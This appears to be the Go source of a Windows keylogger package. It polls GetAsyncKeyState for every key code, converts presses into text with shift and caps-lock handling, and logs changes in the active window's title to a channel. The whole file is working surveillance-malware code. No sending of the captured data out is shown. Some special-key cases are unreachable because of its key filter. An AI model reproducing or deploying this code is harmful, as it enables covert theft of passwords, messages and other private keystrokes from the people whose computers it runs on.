package keylogger

import (
	"syscall"
	"time"
	"unsafe"
)

const (
	// Virtual-Key Codes
	vk_BACK       = 0x08
	vk_TAB        = 0x09
	vk_CLEAR      = 0x0C
	vk_RETURN     = 0x0D
	vk_SHIFT      = 0x10
	vk_CONTROL    = 0x11
	vk_MENU       = 0x12
	vk_PAUSE      = 0x13
	vk_CAPITAL    = 0x14
	vk_ESCAPE     = 0x1B
	vk_SPACE      = 0x20
	vk_PRIOR      = 0x21
	vk_NEXT       = 0x22
	vk_END        = 0x23
	vk_HOME       = 0x24
	vk_LEFT       = 0x25
	vk_UP         = 0x26
	vk_RIGHT      = 0x27
	vk_DOWN       = 0x28
	vk_SELECT     = 0x29
	vk_PRINT      = 0x2A
	vk_EXECUTE    = 0x2B
	vk_SNAPSHOT   = 0x2C
	vk_INSERT     = 0x2D
	vk_DELETE     = 0x2E
	vk_LWIN       = 0x5B
	vk_RWIN       = 0x5C
	vk_APPS       = 0x5D
	vk_SLEEP      = 0x5F
	vk_NUMPAD0    = 0x60
	vk_NUMPAD1    = 0x61
	vk_NUMPAD2    = 0x62
	vk_NUMPAD3    = 0x63
	vk_NUMPAD4    = 0x64
	vk_NUMPAD5    = 0x65
	vk_NUMPAD6    = 0x66
	vk_NUMPAD7    = 0x67
	vk_NUMPAD8    = 0x68
	vk_NUMPAD9    = 0x69
	vk_MULTIPLY   = 0x6A
	vk_ADD        = 0x6B
	vk_SEPARATOR  = 0x6C
	vk_SUBTRACT   = 0x6D
	vk_DECIMAL    = 0x6E
	vk_DIVIDE     = 0x6F
	vk_F1         = 0x70
	vk_F2         = 0x71
	vk_F3         = 0x72
	vk_F4         = 0x73
	vk_F5         = 0x74
	vk_F6         = 0x75
	vk_F7         = 0x76
	vk_F8         = 0x77
	vk_F9         = 0x78
	vk_F10        = 0x79
	vk_F11        = 0x7A
	vk_F12        = 0x7B
	vk_NUMLOCK    = 0x90
	vk_SCROLL     = 0x91
	vk_LSHIFT     = 0xA0
	vk_RSHIFT     = 0xA1
	vk_LCONTROL   = 0xA2
	vk_RCONTROL   = 0xA3
	vk_LMENU      = 0xA4
	vk_RMENU      = 0xA5
	vk_OEM_1      = 0xBA
	vk_OEM_PLUS   = 0xBB
	vk_OEM_COMMA  = 0xBC
	vk_OEM_MINUS  = 0xBD
	vk_OEM_PERIOD = 0xBE
	vk_OEM_2      = 0xBF
	vk_OEM_3      = 0xC0
	vk_OEM_4      = 0xDB
	vk_OEM_5      = 0xDC
	vk_OEM_6      = 0xDD
	vk_OEM_7      = 0xDE
	vk_OEM_8      = 0xDF
)

var (
	user32                   = syscall.NewLazyDLL("user32.dll")
	procGetAsyncKeyState     = user32.NewProc("GetAsyncKeyState")
	procGetForegroundWindow  = user32.NewProc("GetForegroundWindow")
	procGetWindowTextW       = user32.NewProc("GetWindowTextW")
	procGetWindowTextLengthW = user32.NewProc("GetWindowTextLengthW")
)

//Get Active Window Title
func getForegroundWindow() syscall.Handle {
	r1, _, _ := procGetForegroundWindow.Call()
	return syscall.Handle(r1)
}

func getWindowTextLength(h syscall.Handle) int {
	ret, _, _ := procGetWindowTextLengthW.Call(
		uintptr(h))
	return int(ret)
}

func getWindowText(h syscall.Handle) string {
	length := getWindowTextLength(h) + 1
	buf := make([]uint16, length)
	procGetWindowTextW.Call(
		uintptr(h),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(length))
	return syscall.UTF16ToString(buf)
}

func WindowLogger(data chan string) {
	title := ""
	for {
		text := getWindowText(getForegroundWindow())
		if text != "" {
			if title != text {
				title = text
				data <- "\n[" + text + "]\n"
			}
		}
		time.Sleep(3 * time.Millisecond)
	}
}

func KeyLogger(data chan string) {
	var tmpKey, lastKey string
	var shift, caps bool
	for {
		tmpKey = ""
		shiftState, _, _ := procGetAsyncKeyState.Call(uintptr(vk_SHIFT))
		if shiftState == 0x8000 {
			shift = true
		} else {
			shift = false
		}
		for key := 0; key < 256; key++ {
			keyState, _, _ := procGetAsyncKeyState.Call(uintptr(key))
			if keyState&(1<<15) != 0 && !(key < 0x2F && key != 0x20) && (key < 160 || key > 165) && (key < 91 || key > 93) {
				switch key {
				case vk_CONTROL:
					tmpKey = "[Ctrl]"
				case vk_BACK:
					tmpKey = "[Back]"
				case vk_TAB:
					tmpKey = "[Tab]"
				case vk_RETURN:
					tmpKey = "[Enter]\r\n"
				case vk_SHIFT:
					tmpKey = "[Shift]"
				case vk_MENU:
					tmpKey = "[Alt]"
				case vk_CAPITAL:
					tmpKey = "[CapsLock]"
					if caps {
						caps = false
					} else {
						caps = true
					}
				case vk_ESCAPE:
					tmpKey = "[Esc]"
				case vk_SPACE:
					tmpKey = " "
				case vk_PRIOR:
					tmpKey = "[PageUp]"
				case vk_NEXT:
					tmpKey = "[PageDown]"
				case vk_END:
					tmpKey = "[End]"
				case vk_HOME:
					tmpKey = "[Home]"
				case vk_LEFT:
					tmpKey = "[Left]"
				case vk_UP:
					tmpKey = "[Up]"
				case vk_RIGHT:
					tmpKey = "[Right]"
				case vk_DOWN:
					tmpKey = "[Down]"
				case vk_SELECT:
					tmpKey = "[Select]"
				case vk_PRINT:
					tmpKey = "[Print]"
				case vk_EXECUTE:
					tmpKey = "[Execute]"
				case vk_SNAPSHOT:
					tmpKey = "[PrintScreen]"
				case vk_INSERT:
					tmpKey = "[Insert]"
				case vk_DELETE:
					tmpKey = "[Delete]"
				case vk_LWIN:
					tmpKey = "[LeftWindows]"
				case vk_RWIN:
					tmpKey = "[RightWindows]"
				case vk_APPS:
					tmpKey = "[Applications]"
				case vk_SLEEP:
					tmpKey = "[Sleep]"
				case vk_NUMPAD0:
					tmpKey = "[Pad 0]"
				case vk_NUMPAD1:
					tmpKey = "[Pad 1]"
				case vk_NUMPAD2:
					tmpKey = "[Pad 2]"
				case vk_NUMPAD3:
					tmpKey = "[Pad 3]"
				case vk_NUMPAD4:
					tmpKey = "[Pad 4]"
				case vk_NUMPAD5:
					tmpKey = "[Pad 5]"
				case vk_NUMPAD6:
					tmpKey = "[Pad 6]"
				case vk_NUMPAD7:
					tmpKey = "[Pad 7]"
				case vk_NUMPAD8:
					tmpKey = "[Pad 8]"
				case vk_NUMPAD9:
					tmpKey = "[Pad 9]"
				case vk_MULTIPLY:
					tmpKey = "*"
				case vk_ADD:
					if shift {
						tmpKey = "+"
					} else {
						tmpKey = "="
					}
				case vk_SEPARATOR:
					tmpKey = "[Separator]"
				case vk_SUBTRACT:
					if shift {
						tmpKey = "_"
					} else {
						tmpKey = "-"
					}
				case vk_DECIMAL:
					tmpKey = "."
				case vk_DIVIDE:
					tmpKey = "[Divide]"
				case vk_F1:
					tmpKey = "[F1]"
				case vk_F2:
					tmpKey = "[F2]"
				case vk_F3:
					tmpKey = "[F3]"
				case vk_F4:
					tmpKey = "[F4]"
				case vk_F5:
					tmpKey = "[F5]"
				case vk_F6:
					tmpKey = "[F6]"
				case vk_F7:
					tmpKey = "[F7]"
				case vk_F8:
					tmpKey = "[F8]"
				case vk_F9:
					tmpKey = "[F9]"
				case vk_F10:
					tmpKey = "[F10]"
				case vk_F11:
					tmpKey = "[F11]"
				case vk_F12:
					tmpKey = "[F12]"
				case vk_NUMLOCK:
					tmpKey = "[NumLock]"
				case vk_SCROLL:
					tmpKey = "[ScrollLock]"
				case vk_LSHIFT:
					tmpKey = "[LeftShift]"
				case vk_RSHIFT:
					tmpKey = "[RightShift]"
				case vk_LCONTROL:
					tmpKey = "[LeftCtrl]"
				case vk_RCONTROL:
					tmpKey = "[RightCtrl]"
				case vk_LMENU:
					tmpKey = "[LeftMenu]"
				case vk_RMENU:
					tmpKey = "[RightMenu]"
				case vk_OEM_1:
					if shift {
						tmpKey = ":"
					} else {
						tmpKey = ";"
					}
				case vk_OEM_2:
					if shift {
						tmpKey = "?"
					} else {
						tmpKey = "/"
					}
				case vk_OEM_3:
					if shift {
						tmpKey = "~"
					} else {
						tmpKey = "`"
					}
				case vk_OEM_4:
					if shift {
						tmpKey = "{"
					} else {
						tmpKey = "["
					}
				case vk_OEM_5:
					if shift {
						tmpKey = "|"
					} else {
						tmpKey = "\\"
					}
				case vk_OEM_6:
					if shift {
						tmpKey = "}"
					} else {
						tmpKey = "]"
					}
				case vk_OEM_7:
					if shift {
						tmpKey = `"`
					} else {
						tmpKey = "'"
					}
				case vk_OEM_PERIOD:
					if shift {
						tmpKey = ">"
					} else {
						tmpKey = "."
					}
				case 0x30:
					if shift {
						tmpKey = ")"
					} else {
						tmpKey = "0"
					}
				case 0x31:
					if shift {
						tmpKey = "!"
					} else {
						tmpKey = "1"
					}
				case 0x32:
					if shift {
						tmpKey = "@"
					} else {
						tmpKey = "2"
					}
				case 0x33:
					if shift {
						tmpKey = "#"
					} else {
						tmpKey = "3"
					}
				case 0x34:
					if shift {
						tmpKey = "$"
					} else {
						tmpKey = "4"
					}
				case 0x35:
					if shift {
						tmpKey = "%"
					} else {
						tmpKey = "5"
					}
				case 0x36:
					if shift {
						tmpKey = "^"
					} else {
						tmpKey = "6"
					}
				case 0x37:
					if shift {
						tmpKey = "&"
					} else {
						tmpKey = "7"
					}
				case 0x38:
					if shift {
						tmpKey = "*"
					} else {
						tmpKey = "8"
					}
				case 0x39:
					if shift {
						tmpKey = "("
					} else {
						tmpKey = "9"
					}
				case 0x41:
					if caps || shift {
						tmpKey = "A"
					} else {
						tmpKey = "a"
					}
				case 0x42:
					if caps || shift {
						tmpKey = "B"
					} else {
						tmpKey = "b"
					}
				case 0x43:
					if caps || shift {
						tmpKey = "C"
					} else {
						tmpKey = "c"
					}
				case 0x44:
					if caps || shift {
						tmpKey = "D"
					} else {
						tmpKey = "d"
					}
				case 0x45:
					if caps || shift {
						tmpKey = "E"
					} else {
						tmpKey = "e"
					}
				case 0x46:
					if caps || shift {
						tmpKey = "F"
					} else {
						tmpKey = "f"
					}
				case 0x47:
					if caps || shift {
						tmpKey = "G"
					} else {
						tmpKey = "g"
					}
				case 0x48:
					if caps || shift {
						tmpKey = "H"
					} else {
						tmpKey = "h"
					}
				case 0x49:
					if caps || shift {
						tmpKey = "I"
					} else {
						tmpKey = "i"
					}
				case 0x4A:
					if caps || shift {
						tmpKey = "J"
					} else {
						tmpKey = "j"
					}
				case 0x4B:
					if caps || shift {
						tmpKey = "K"
					} else {
						tmpKey = "k"
					}
				case 0x4C:
					if caps || shift {
						tmpKey = "L"
					} else {
						tmpKey = "l"
					}
				case 0x4D:
					if caps || shift {
						tmpKey = "M"
					} else {
						tmpKey = "m"
					}
				case 0x4E:
					if caps || shift {
						tmpKey = "N"
					} else {
						tmpKey = "n"
					}
				case 0x4F:
					if caps || shift {
						tmpKey = "O"
					} else {
						tmpKey = "o"
					}
				case 0x50:
					if caps || shift {
						tmpKey = "P"
					} else {
						tmpKey = "p"
					}
				case 0x51:
					if caps || shift {
						tmpKey = "Q"
					} else {
						tmpKey = "q"
					}
				case 0x52:
					if caps || shift {
						tmpKey = "R"
					} else {
						tmpKey = "r"
					}
				case 0x53:
					if caps || shift {
						tmpKey = "S"
					} else {
						tmpKey = "s"
					}
				case 0x54:
					if caps || shift {
						tmpKey = "T"
					} else {
						tmpKey = "t"
					}
				case 0x55:
					if caps || shift {
						tmpKey = "U"
					} else {
						tmpKey = "u"
					}
				case 0x56:
					if caps || shift {
						tmpKey = "V"
					} else {
						tmpKey = "v"
					}
				case 0x57:
					if caps || shift {
						tmpKey = "W"
					} else {
						tmpKey = "w"
					}
				case 0x58:
					if caps || shift {
						tmpKey = "X"
					} else {
						tmpKey = "x"
					}
				case 0x59:
					if caps || shift {
						tmpKey = "Y"
					} else {
						tmpKey = "y"
					}
				case 0x5A:
					if caps || shift {
						tmpKey = "Z"
					} else {
						tmpKey = "z"
					}
				}
				break
			}
		}
		if tmpKey != "" {
			if tmpKey != lastKey {
				lastKey = tmpKey
				data <- tmpKey
			}
		} else {
			lastKey = ""
		}
		time.Sleep(10 * time.Millisecond)
	}
}
